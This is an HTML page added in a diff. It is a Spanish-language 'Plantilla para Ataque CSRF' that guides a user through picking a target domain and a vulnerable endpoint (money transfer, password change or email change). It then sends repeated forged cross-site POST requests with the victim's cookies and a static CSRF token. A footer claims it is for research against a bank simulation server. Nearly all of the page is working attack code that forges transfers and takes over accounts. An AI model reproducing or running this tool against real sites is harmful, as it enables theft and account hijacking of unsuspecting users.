@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack Webside</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="marco">
+        <h1>
+            Plantilla para Ataque CSRF </h1>
+        <!-- <form name="form" action="http://localhost:4000/#/transactions/1" method="POST">
+                <input type="hidden" name="nombre" value="Ejmplo">
+                <input type="hidden" name="apellido" value="sdasd">
+            <input type="submit">
+            </form> -->
+        <div>
+            <div class="steps">
+                <span class="title-s">Paso 1:</span>
+                <span>Seleccione el dominio al que va a realizar el ataque,<br> para este caso si subio el servidor en
+                    local puede usar el local o puede usar tambien el servidor en internet</span>
+            </div>
+
+            <div>
+                <select name="domain" id="domain" class="select" onchange="paso1Completo()">
+                    <option value="" disabled selected hidden>Selecciona una opción</option>
+                    <option value="http://localhost:8080">http://localhost:8080</option>
+                    <option value="https://backprojectgrade.up.railway.app">https://backprojectgrade.up.railway.app"
+                    </option>
+                </select>
+            </div>
+        </div>
+        <div id="step2" style="display: none;">
+            <div class="steps">
+                <span class="title-s">Paso 2:</span>
+                <span> seleccione una de la rutas vulnerables.</span>
+            </div>
+            <div>
+                <select name="endpoint" id="endpoint" class="select" onchange="mostrarOcultarDivs()">
+                    <option value="" disabled selected hidden>Selecciona una opción</option>
+                    <option value="/acount/transferToAcount3">/acount/transferToAcount3</option>
+                    <option value="/user/editpass">/user/editpass</option>
+                    <option value="/user/editemail">/user/editemail</option>
+                </select>
+            </div>
+        </div>
+        <div id="step3" style="display: none;">
+            <div class="steps">
+                <span class="title-s">Paso 3:</span>
+                <span>Ingrese los valores indicados para el ataque</span>
+            </div>
+            <div>
+                <div id="div1" style="display: none;">
+                    <form action="">
+                        <label for="">Cuenta de origen</label>
+                        <input id="accountOrigin" type="number"><br>
+                        <label for="">Cuenta de destino</label>
+                        <input id="accountDestiny" type="number"><br>
+                        <label for="">valor</label>
+                        <input id="value" type="number">
+                    </form>
+                </div>
+                <div id="div2" style="display: none;">
+                    <form action="">
+                        <label for="">Nuevo password</label>
+                        <input id="pass" type="text">
+                    </form>
+                </div>
+                <div id="div3" style="display: none;">
+                    <form action="">
+                        <label for="">Nuevo correo</label>
+                        <input id="mail" id="" type="text">
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div id="step4" style="display: none;">
+            <div class="steps">
+                <span class="title-s">Paso 4:</span>
+                <span>Envie la solicitud de ataque con los parametros que ingreso.</span><br>
+                <span>Clic en el boton 'Generar ataque'</span>
+            </div>
+            <div>
+                <div>
+                    <span>Url generada para el ataque: </span>
+                    <span id="url"></span>
+                </div>
+                <div>
+                    <span></span>
+                </div>
+                <div class="steps">
+                    <span class="title-s">Paso 4.5:</span>
+                    <span>Puede agregar la cantidad de peticiones que con las que desea hacer el ataque</span><br>
+                    <form action="">
+                        <label for="">Cantidad de peticiones realizadas: </label>
+                        <input id="cantPetis" type="number" value="1">
+                    </form>
+                </div>
+                <div>
+                    <button onclick="realizarVariosAtaques()" class="btn-submit">Generar Ataque</button>
+                </div>
+            </div>
+        </div>
+        <div id="step4" style="display: none;">
+
+        </div>
+        <div id="step5" style="display: none;">
+            <div class="steps">
+                <span class="title-s">Paso 5:</span>
+                <span>La respuesta de la solicitud fue ...</span>
+            </div>
+            <div>
+                <div>
+                    <span>Status: </span>
+                    <span id="status"></span>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+    <div>
+        <h5>
+            Este software es realizado solo para investigacion, no tiene proposito mas que la validacion de ataques a un
+            servidor de simulacion.
+        </h5>
+    </div>
+    <script>
+
+        const step1 = true;
+        var step2 = false;
+        var step3 = false;
+        var step4 = false;
+        var step5 = false;
+        var urlAtaque = '';
+        var status = 0;
+        function paso1Completo() {
+            step2 = true;
+            document.getElementById("step2").style.display = "block";
+        }
+
+        function mostrarOcultarDivs() {
+            step3 = true;
+            document.getElementById("step3").style.display = "block";
+            step4 = true;
+            document.getElementById("step4").style.display = "block";
+            // Obtener el valor seleccionado
+            var valorSeleccionado = document.getElementById("endpoint").value;
+
+            // Mostrar u ocultar el div1 dependiendo del valor seleccionado
+            if (valorSeleccionado === "/acount/transferToAcount3") {
+                document.getElementById("div1").style.display = "block";
+                document.getElementById("div2").style.display = "none";
+                document.getElementById("div3").style.display = "none";
+            } else if (valorSeleccionado === "/user/editpass") {
+                document.getElementById("div1").style.display = "none";
+                document.getElementById("div2").style.display = "block";
+                document.getElementById("div3").style.display = "none";
+            } else if (valorSeleccionado === "/user/editemail") {
+                document.getElementById("div1").style.display = "none";
+                document.getElementById("div2").style.display = "none";
+                document.getElementById("div3").style.display = "block";
+            }
+            var select = document.getElementById("domain");
+            var valorDomain = select.value;
+            var valorEnpoint = document.getElementById("endpoint").value;
+            urlAtaque = valorDomain + valorEnpoint
+            var span = document.getElementById("url");
+            span.textContent = urlAtaque;
+        }
+
+        function realizarVariosAtaques() {
+            var cantPetis = document.getElementById("cantPetis").value;
+            console.log(cantPetis);
+            for (let index = 0; index < cantPetis; index++) {
+                realizarAtaque();
+            }
+        }
+
+        let statusAttack = {
+            total: 0,
+            status200: 0,
+            status400: 0,
+            status404: 0,
+            status500: 0,
+            other: 0
+        };
+
+        function realizarAtaque() {
+            var valorSeleccionado = document.getElementById("endpoint").value;
+            fetch('https://bank-sim-project.web.app', {
+                method: 'POST',
+                credentials: 'include'
+            }).then((res) => console.log(res));
+            console.log(urlAtaque);
+            // Mostrar u ocultar el div1 dependiendo del valor seleccionado
+            if (valorSeleccionado === "/acount/transferToAcount3") {
+                var accountOrigin = document.getElementById("accountOrigin").value;
+                var accountDestiny = document.getElementById("accountDestiny").value;
+                var value = document.getElementById("value").value;
+                console.log('originNumber=' + accountOrigin + '&destinyNumber=' + accountDestiny + '&cantTranfer=' + value)
+                fetch(urlAtaque, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        // 'Content-Type': 'application/json',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        //  'Access-Control-Allow-Origin': '*',
+                        // 'Origin': 'http://localhost:4200',
+                        // 'X-CSRF-TOKEN': 'your-csrf-token-value' //token estatico encontrado.
+                    },
+                    // body:  JSON.stringify({"originNumber": "7659626682649996","destinyNumber": "7870617955556563","cantTranfer": "3"})
+                    body: 'originNumber=' + accountOrigin + '&destinyNumber=' + accountDestiny + '&cantTranfer=' + value
+                })
+                    .then(text => {
+                        console.log(text);
+                        status = text.status
+                        var span = document.getElementById("status");
+                        setStatus();
+                        span.textContent = JSON.stringify(statusAttack);
+                    })
+                    .catch(err => {
+                        console.log(err)
+                        status = err.status
+                        var span = document.getElementById("status");
+                        span.textContent = status + ': Ataque fallido';
+                    }).finally(() => {
+
+                        document.getElementById("step5").style.display = "block";
+                    });
+            } else if (valorSeleccionado === "/user/editpass") {
+                var passOrMail = document.getElementById("pass").value;
+                console.log(passOrMail)
+                console.log(JSON.stringify({ "password": passOrMail }));
+                fetch(urlAtaque, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        //  'Content-Type': 'application/x-www-form-urlencoded',
+                        //  'Access-Control-Allow-Origin': '*',
+                        // 'Origin': 'http://localhost:4200',
+                        'X-CSRF-TOKEN': 'your-csrf-token-value' //token estatico encontrado.
+                    },
+                    body: JSON.stringify({ "password": passOrMail })
+                    // body: '{password=Alex123$$}'
+                })
+                    .then(text => {
+                        console.log(text)
+                        status = text.status
+                        var span = document.getElementById("status");
+                        setStatus()
+                        span.textContent = JSON.stringify(statusAttack);
+                    })
+                    .catch(err => {
+                        console.log(err)
+                        status = err.status
+                        var span = document.getElementById("status");
+                        span.textContent = status + ': Ataque fallido';
+                    }).finally(() => {
+                        document.getElementById("step5").style.display = "block";
+                    });;
+            } else if (valorSeleccionado === "/user/editemail") {
+                var passOrMail = document.getElementById("mail").value;
+                console.log(JSON.stringify({ "email": passOrMail }));
+                fetch(urlAtaque, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        //  'Content-Type': 'application/x-www-form-urlencoded',
+                        //  'Access-Control-Allow-Origin': '*',
+                        // 'Origin': 'http://localhost:4200',
+                        'X-CSRF-TOKEN': 'your-csrf-token-value' //token estatico encontrado.
+
+                    },
+                    body: JSON.stringify({ "email": passOrMail })
+                    // body: '{password=Alex123$$}'
+                })
+                    .then(text => {
+                        console.log(text);
+                        status = text.status
+                        var span = document.getElementById("status");
+                        setStatus();
+                        span.textContent = JSON.stringify(statusAttack);
+                    })
+                    .catch(err => {
+                        console.log(err);
+                        status = err.status
+                        var span = document.getElementById("status");
+                        span.textContent = status + ': Ataque fallido';
+                    }).finally(() => {
+                        document.getElementById("step5").style.display = "block";
+                    });;
+            }
+
+
+            //document.form.submit();
+        }
+
+        function setStatus() {
+            statusAttack.total++;
+            switch (status + '') {
+                case '200':
+                    statusAttack.status200++;
+                    break;
+                case '400':
+                    statusAttack.status400++;
+                    break;
+                case '404':
+                    statusAttack.status404++;
+                    break;
+                case '500':
+                    statusAttack.status500++;
+                    break;
+                default:
+                    statusAttack.other++;
+                    break;
+            }
+        }
+    </script>
+</body>
+
+</html>
